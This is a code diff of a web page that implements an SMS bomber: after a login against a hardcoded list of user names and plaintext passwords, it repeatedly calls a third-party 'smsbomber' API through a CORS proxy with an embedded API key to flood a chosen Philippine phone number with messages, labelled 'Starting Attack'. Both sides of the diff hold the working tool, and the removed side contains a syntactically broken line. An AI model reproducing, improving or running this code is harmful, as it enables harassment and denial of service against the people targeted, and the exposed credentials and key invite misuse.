@@ -125,100 +125,42 @@ h1, h2 {
     <div class="timer" id="timerDisplay"></div>  
     <div class="log" id="logBox"></div>  
   </div>    <script>  
-const certifiedUsers = [  
-  { name: "Admin", pass: "Bomva" },  
-  { name: "Dave", pass: "Gwapo" },  
-  { name: "Aaron", pass: "Madamba" },  
-  { name: "Johnsen", pass: "2Pak" },  
-  { name: "Jaco", pass: "Bowlrat" },  
-  { name: "Kajo", pass: "Goodjao" },  
-  { name: "Sam", pass: "Stick-O" },  
-  { name: "Ivan", pass: "Aeta" },  
-  { name: "Brix", pass: "Bantor" },  
-  { name: "Julliana", pass: "Jul2301" },  
-  { name: "Angel", pass: "Ang0102" },  
-  { name: "Janelle", pass: "Jan9911" },  
-  { name: "Sky", pass: "Sky822" },  
-  { name: "Pauline", pass: "Pau1717" },  
-  { name: "Julieane", pass: "Jul821" },  
-  { name: "Mac", pass: "Mac0303" },  
-  { name: "Cris", pass: "Cris090" },  
-  { name: "Kiana", pass: "Kia555" },  
-  { name: "Ericka", pass: "Eri333" },  
-  { name: "Keith", pass: "Kei888" },  
-  { name: "Frances", pass: "Fra111" },  
-  { name: "Tristan", pass: "Tri942" },  
-  { name: "Mielle", pass: "Mie707" },  
-  { name: "Joervin", pass: "Joe291" },  
-  { name: "Vienne", pass: "Vie141" },  
-  { name: "Jewel", pass: "Jew601" }  
-];  
-  
-let currentUser = "";  
-let userUsage = {};  
-let lastLogDate = "";  
-  
-function checkLogReset() {  
-  const now = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Manila" }));  
-  const todayStr = `${now.getFullYear()}-${now.getMonth()+1}-${now.getDate()}`;  
-  
-  if (lastLogDate !== todayStr) {  
-    lastLogDate = todayStr;  
-    document.getElementById("logBox").innerHTML = "";  // clear logs  
-    if (currentUser !== "") updateChancesDisplay();     // refresh chances  
-  }  
-}  
-  
-// Automatically check every 1 minute (adjustable)  
-setInterval(checkLogReset, 60000);  
-      
-function togglePassword() {  
-  const pw = document.getElementById("password");  
-  pw.type = pw.type === "password" ? "text" : "password";  
-}  
-  
-function showValidUsers() {  
-  const visibleUsers = certifiedUsers.filter(u => u.name !== "Admin").map(u => u.name);  
-  
-  const oldPopup = document.getElementById("validUsersPopup");  
-  if (oldPopup) oldPopup.remove();  
+    function showValidUsers() {  
+  const visibleUsers = certifiedUsers  
+    .filter(u => u.name !== "Admin")  
+    .map(u => u.name);  
   
   const popup = document.createElement("div");  
   popup.id = "validUsersPopup";  
-  Object.assign(popup.style, {  
-    position: "fixed",  
-    bottom: "20px",  
-    right: "20px",  
-    background: "#03182f",  
-    color: "#00bfff",  
-    padding: "15px",  
-    borderRadius: "10px",  
-    border: "1px solid #00bfff",  
-    boxShadow: "0 0 10px #00bfff",  
-    maxHeight: "200px",  
-    overflowY: "auto",  
-    zIndex: "9999",  
-    width: "200px"  
-  });  
+  popup.style.position = "fixed";  
+  popup.style.bottom = "20px";  
+  popup.style.right = "20px";  
+  popup.style.background = "#03182f";  
+  popup.style.color = "#00bfff";  
+  popup.style.padding = "15px";  
+  popup.style.borderRadius = "10px";  
+  popup.style.border = "1px solid #00bfff";  
+  popup.style.boxShadow = "0 0 10px #00bfff";  
+  popup.style.maxHeight = "200px";  
+  popup.style.overflowY = "auto";  
+  popup.style.zIndex = "9999";  
+  popup.style.width = "200px";  
   
   const closeBtn = document.createElement("div");  
   closeBtn.textContent = "✖";  
-  Object.assign(closeBtn.style, {  
-    position: "absolute",  
-    top: "5px",  
-    right: "10px",  
-    cursor: "pointer",  
-    fontWeight: "bold",  
-    color: "#ff6666"  
-  });  
+  closeBtn.style.position = "absolute";  
+  closeBtn.style.top = "5px";  
+  closeBtn.style.right = "10px";  
+  closeBtn.style.cursor = "pointer";  
+  closeBtn.style.fontWeight = "bold";  
+  closeBtn.style.color = "#ff6666";  
   closeBtn.onclick = () => popup.remove();  
+  popup.appendChild(closeBtn);  
   
   const title = document.createElement("div");  
   title.textContent = "📜 Valid Users";  
   title.style.fontWeight = "bold";  
   title.style.marginBottom = "10px";  
-  
-  popup.appendChild(closeBtn);  
   popup.appendChild(title);  
   
   visibleUsers.forEach(user => {  
@@ -227,172 +169,205 @@ function showValidUsers() {
     popup.appendChild(userLine);  
   });  
   
+  // remove old popup if open  
+  const oldPopup = document.getElementById("validUsersPopup");  
+  if (oldPopup) oldPopup.remove();  
+  
   document.body.appendChild(popup);  
 }  
   
-function login() {  
-  const inputName = document.getElementById("username").value.trim();  
-  const inputPass = document.getElementById("password").value.trim();  
-  const loginMessage = document.getElementById("loginMessage");  
-  const found = certifiedUsers.find(u => u.name === inputName && u.pass === inputPass);  
+    const certifiedUsers = [  
+      { name: "Admin", pass: "Bomva" },  
+      { name: "Dave", pass: "Gwapo" },  
+      { name: "Aaron", pass: "Madamba" },  
+      { name: "Johnsen", pass: "2Pak" },  
+      { name: "Jaco", pass: "Bowlrat" },  
+      { name: "Kajo", pass: "Goodjao" },  
+      { name: "Sam", pass: "Stick-O" },  
+      { name: "Ivan", pass: "Aeta" },  
+      { name: "Brix", pass: "Bantor" },  
+      { name: "Julliana", pass: "Jul2301" },  
+      { name: "Angel", pass: "Ang0102" },  
+      { name: "Janelle", pass: "Jan9911" },  
+      { name: "Sky", pass: "Sky822" },  
+      { name: "Pauline", pass: "Pau1717" },  
+      { name: "Julieane", pass: "Jul821" },  
+      { name: "Mac", pass: "Mac0303" },  
+      { name: "Cris", pass: "Cris090" },  
+      { name: "Kiana", pass: "Kia555" },  
+      { name: "Ericka", pass: "Eri333" },  
+      { name: "Keith", pass: "Kei888" },  
+      { name: "Frances", pass: "Fra111" },  
+      { name: "Tristan", pass: "Tri942" },  
+      { name: "Mielle", pass: "Mie707" },  
+      { name: "Joervin", pass: "Joe291" },  
+      { name: "Vienne", pass: "Vie141" },  
+      { name: "Jewel", pass: "Jew601" }  
+    ];  
   
-  if (!found) return loginMessage.textContent = "❌ Invalid credentials.";  
+    let currentUser = "";  
+    let userUsage = {};  
   
-  currentUser = found.name;  
-  document.getElementById("login-section").style.display = "none";  
-  document.getElementById("main-section").style.display = "block";  
-  updateChancesDisplay();  
-  
-  if (currentUser === "Admin") {  
-    const saveBtn = document.createElement("button");  
-    saveBtn.textContent = "📥 Save Log";  
-    saveBtn.onclick = downloadLog;  
-    document.getElementById("main-section").appendChild(saveBtn);  
-  
-    const userSelect = document.createElement("select");  
-    userSelect.id = "adminResetSelect";  
-    userSelect.style.marginRight = "10px";  
-    userSelect.style.padding = "5px";  
-    userSelect.style.borderRadius = "5px";  
-  
-    const allOption = document.createElement("option");  
-    allOption.value = "all";  
-    allOption.textContent = "Reset All Users";  
-    userSelect.appendChild(allOption);  
-  
-    certifiedUsers.forEach(user => {  
-      if (user.name !== "Admin") {  
-        const opt = document.createElement("option");  
-        opt.value = user.name;  
-        opt.textContent = user.name;  
-        userSelect.appendChild(opt);  
-      }  
-    });  
-  
-    const resetBtn = document.createElement("button");  
-    resetBtn.textContent = "🔄 Reset Chances";  
-    resetBtn.style.marginLeft = "10px";  
-    resetBtn.onclick = () => {  
-      const choice = document.getElementById("adminResetSelect").value;  
-      const today = new Date().toISOString().split("T")[0];  
-      if (choice === "all") {  
-        certifiedUsers.forEach(user => {  
-          if (!userUsage[user.name]) userUsage[user.name] = {};  
-          userUsage[user.name][today] = { chances: 5 };  
-        });  
-        alert("✅ All users' chances have been reset to 5.");  
-      } else {  
-        if (!userUsage[choice]) userUsage[choice] = {};  
-        userUsage[choice][today] = { chances: 5 };  
-        alert(`✅ ${choice}'s chances have been reset to 5.`);  
-      }  
-    };  
-  
-    document.getElementById("main-section").append(userSelect, resetBtn);  
-  }  
-}  
-  
-function updateChancesDisplay() {  
-  const today = new Date().toISOString().split("T")[0];  
-  const used = userUsage[currentUser]?.[today]?.chances || 0;  
-  document.getElementById("chancesDisplay").textContent =  
-    currentUser === "Admin" ? "Logged in as Admin" : `Chances Left Today: ${5 - used}`;  
-}  
-  
-function downloadLog() {  
-  const log = document.getElementById("logBox").innerText.trim();  
-  
-  if (!log) {  
-    alert("⚠️ No log data to save.");  
-    return;  
-  }  
-  
-  // PH Time (GMT+8)  
-  const now = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Manila" }));  
-  const day = now.getDate().toString().padStart(2, '0');  
-  const month = (now.getMonth() + 1).toString().padStart(2, '0');  
-  const year = now.getFullYear();  
-  
-  const filename = `log_${day}-${month}-${year}.txt`;  
-  
-  const blob = new Blob([log], { type: 'text/plain' });  
-  const url = URL.createObjectURL(blob);  
-  const a = document.createElement("a");  
-  a.href = url;  
-  a.download = filename;  
-  document.body.appendChild(a);  
-  a.click();  
-  document.body.removeChild(a);  
-  URL.revokeObjectURL(url);  
-}  
-      
-function startSimulation() {  
-  let number = document.getElementById("number").value.trim();  
-  const count = parseInt(document.getElementById("count").value.trim());  
-  const delay = parseFloat(document.getElementById("delay").value.trim()) || 1.5;  
-  const logBox = document.getElementById("logBox");  
-  const timerDisplay = document.getElementById("timerDisplay");  
-  const api_key = "b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8";  
-  
-  if (number.length === 10 && number.startsWith("9")) {  
-    number = "0" + number;  
-    document.getElementById("number").value = number;  
-  }  
-  
-  const isValidNumber = /^09\d{9}$/.test(number);  
-  if (!isValidNumber || isNaN(count) || count <= 0 || isNaN(delay)) {  
-    logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Invalid phone number, count, or delay.</div>";  
-    return;  
-  }  
-  
-  const today = new Date().toISOString().split("T")[0];  
-  if (!userUsage[currentUser]) userUsage[currentUser] = {};  
-  if (!userUsage[currentUser][today]) userUsage[currentUser][today] = { chances: 0 };  
-  
-  if (currentUser !== "Admin") {  
-    if (userUsage[currentUser][today].chances >= 5 || count > 20) {  
-      logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Limit reached.</div>";  
-      return;  
+    function togglePassword() {  
+      const pw = document.getElementById("password");  
+      pw.type = pw.type === "password" ? "text" : "password";  
     }  
-    userUsage[currentUser][today].chances++;  
-    updateChancesDisplay();  
+  
+    function showValidUsers() {  
+      const visibleUsers = certifiedUsers.filter(u => u.name !== "Admin").map(u => u.name);  
+      alert("📜 Valid Users:\n\n• " + visibleUsers.join("\n• "));  
+    }  
+  
+    function login() {  
+      const inputName = document.getElementById("username").value.trim();  
+      const inputPass = document.getElementById("password").value.trim();  
+      const loginMessage = document.getElementById("loginMessage");  
+  
+      const found = certifiedUsers.find(u => u.name === inputName && u.pass === inputPass);  
+  
+      if (found) {  
+        currentUser = found.name;  
+        document.getElementById("login-section").style.display = "none";  
+        document.getElementById("main-section").style.display = "block";  
+        updateChancesDisplay();  
+  
+        if (currentUser === "Admin") {  
+          const saveBtn = document.createElement("button");  
+          saveBtn.textContent = "📥 Save Log";  
+          saveBtn.onclick = downloadLog;  
+          document.getElementById("main-section").appendChild(saveBtn);  
+  
+          const userSelect = document.createElement("select");  
+userSelect.id = "adminResetSelect";  
+userSelect.style.marginRight = "10px";  
+userSelect.style.padding = "5px";  
+userSelect.style.borderRadius = "5px";  
+  
+const allOption = document.createElement("option");  
+allOption.value = "all";  
+allOption.textContent = "Reset All Users";  
+userSelect.appendChild(allOption);  
+  
+certifiedUsers.forEach(user => {  
+  if (user.name !== "Admin") {  
+    const opt = document.createElement("option");  
+    opt.value = user.name;  
+    opt.textContent = user.name;  
+    userSelect.appendChild(opt);  
   }  
+});  
   
-  logBox.innerHTML = "";  
-  timerDisplay.textContent = "🚀 Starting Attack...";  
+document.getElementById("main-section").appendChild(userSelect);  
   
-  let completed = 0;  
-  for (let i = 1; i <= count; i++) {  
-    const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=${api_key}`;  
-  
-    setTimeout(() => {  
-      fetch(url)  
-        .then(res => res.json())  
-        .then(data => {  
-          const result = data.message || "SMS bombing completed.";  
-          const log = document.createElement("div");  
-          log.className = "log-entry";  
-          log.textContent = `${i.toString().padStart(2, '0')} ✅ Sent to ${number}: ${result}`;  
-          logBox.appendChild(log);  
-          logBox.scrollTop = logBox.scrollHeight;  
-          sendLog(currentUser, number, result);  
-          completed++;  
-          if (completed === count) timerDisplay.textContent = "✅ Attack Finished.";  
-        })  
-          if (currentUser === "Admin") sendLog(currentUser, number, count);  
-          
-        .catch(error => {  
-          const log = document.createElement("div");  
-          log.className = "log-entry";  
-          log.style.color = "red";  
-          log.textContent = `${i.toString().padStart(2, '0')} ❌ Error: ${error.message}`;  
-          logBox.appendChild(log);  
-          logBox.scrollTop = logBox.scrollHeight;  
-          completed++;  
-          if (completed === count) timerDisplay.textContent = "✅ Attack Finished.";  
-        });  
-    }, i * delay * 1000);  
+const resetBtn = document.createElement("button");  
+resetBtn.textContent = "🔄 Reset Chances";  
+resetBtn.style.marginLeft = "10px";  
+resetBtn.onclick = () => {  
+  const choice = document.getElementById("adminResetSelect").value;  
+  const today = new Date().toISOString().split("T")[0];  
+  if (choice === "all") {  
+    certifiedUsers.forEach(user => {  
+      if (!userUsage[user.name]) userUsage[user.name] = {};  
+      userUsage[user.name][today] = { chances: 5 };  
+    });  
+    alert("✅ All users' chances have been reset to 5.");  
+  } else {  
+    if (!userUsage[choice]) userUsage[choice] = {};  
+    userUsage[choice][today] = { chances: 5 };  
+    alert(`✅ ${choice}'s chances have been reset to 5.`);  
   }  
-}  
-</script>  </body>  
+};  
+  
+document.getElementById("main-section").appendChild(resetBtn);  
+        }  
+      } else {  
+        loginMessage.textContent = "❌ Invalid credentials.";  
+      }  
+    }  
+  
+    function updateChancesDisplay() {  
+      const today = new Date().toISOString().split("T")[0];  
+      const used = userUsage[currentUser]?.[today]?.chances || 0;  
+      if (currentUser !== "Admin") {  
+        document.getElementById("chancesDisplay").textContent = `Chances Left Today: ${5 - used}`;  
+      } else {  
+        document.getElementById("chancesDisplay").textContent = "Logged in as Admin";  
+      }  
+    }  
+  
+    function downloadLog() {  
+      const log = document.getElementById("logBox").innerText;  
+      const blob = new Blob([log], { type: 'text/plain' });  
+      const url = URL.createObjectURL(blob);  
+      const a = document.createElement("a");  
+      a.href = url;  
+      a.download = "sms_log.txt";  
+      a.click();  
+    }  
+  
+    function startSimulation() {  
+      let number = document.getElementById('number').value.trim();  
+      const count = parseInt(document.getElementById('count').value.trim());  
+      const delay = parseFloat(document.getElementById('delay').value.trim()) || 1.5;  
+      const logBox = document.getElementById('logBox');  
+      const timerDisplay = document.getElementById('timerDisplay');  
+      const api_key = "b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8";  
+  
+      if (number.length === 10 && number.startsWith("9")) {  
+        number = "0" + number;  
+        document.getElementById('number').value = number;  
+      }  
+  
+      const isValidNumber = /^09\d{9}$/.test(number);  
+      if (!isValidNumber || isNaN(count) || count <= 0 || isNaN(delay)) {  
+        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Invalid phone number, count, or delay.</div>";  
+        return;  
+      }  
+  
+      const today = new Date().toISOString().split("T")[0];  
+      if (!userUsage[currentUser]) userUsage[currentUser] = {};  
+      if (!userUsage[currentUser][today]) userUsage[currentUser][today] = { chances: 0 };  
+  
+      if (currentUser !== "Admin") {  
+        if (userUsage[currentUser][today].chances >= 5 || count > 20) {  
+          logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Limit reached.</div>";  
+          return;  
+        }  
+        userUsage[currentUser][today].chances++;  
+        updateChancesDisplay();  
+      }  
+  
+      logBox.innerHTML = "";  
+      timerDisplay.textContent = "🚀 Starting Attack...";  
+  
+      let completed = 0;  
+      for (let i = 1; i <= count; i++) {  
+        const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=${api_key}`;  
+  
+        setTimeout(() => {  
+          fetch(url)  
+            .then(res => res.json())  
+            .then(data => {  
+              const log = document.createElement('div');  
+              log.className = 'log-entry';  
+              log.textContent = `${i.toString().padStart(2, '0')} ✅ Sent to ${number}: ${data.message || "SMS bombing completed using multiple services."}`;  
+              logBox.appendChild(log);  
+              logBox.scrollTop = logBox.scrollHeight;  
+              completed++;  
+              if (completed === count) timerDisplay.textContent = "✅ Attack Finished.";  
+            })  
+            .catch(error => {  
+              const log = document.createElement('div');  
+              log.className = 'log-entry';  
+              log.style.color = 'red';  
+              log.textContent = `${i.toString().padStart(2, '0')} ❌ Error: ${error.message}`;  
+              logBox.appendChild(log);  
+              logBox.scrollTop = logBox.scrollHeight;  
+              completed++;  
+              if (completed === count) timerDisplay.textContent = "✅ Attack Finished.";  
+            });  
+        }, i * delay * 1000);  
+      }  
+    }  
+  </script>  </body>  
 </html>
